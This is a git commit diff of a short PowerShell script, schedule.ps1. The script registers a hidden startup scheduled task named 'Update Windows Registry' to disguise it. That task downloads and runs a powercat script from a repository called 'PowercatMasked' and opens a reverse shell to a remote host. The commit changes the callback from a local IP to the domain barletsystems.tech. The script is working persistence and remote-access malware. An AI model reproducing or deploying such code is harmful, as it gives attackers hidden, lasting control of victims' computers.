13ebf7ec796131d4be4d8f395bd9c897abcceb2f
simeone22 <47712260+simeone22@users.noreply.github.com>
2022-02-05 15:36:04 +0100

    Update schedule.ps1

--- schedule.ps1
+++ schedule.ps1
@@ -1,3 +1,3 @@
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$action = New-ScheduledTaskAction -Execute "powershell -windowstyle hidden -c IEX(IWR https://raw.githubusercontent.com/simeone22/PowercatMasked/main/powercat.ps1 -UseBasicParsing); PtyS 192.168.0.107 87"
+$action = New-ScheduledTaskAction -Execute "powershell -windowstyle hidden -c IEX(IWR https://raw.githubusercontent.com/simeone22/PowercatMasked/main/powercat.ps1 -UseBasicParsing); PtyS barletsystems.tech 48887"
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Update Windows Registry"
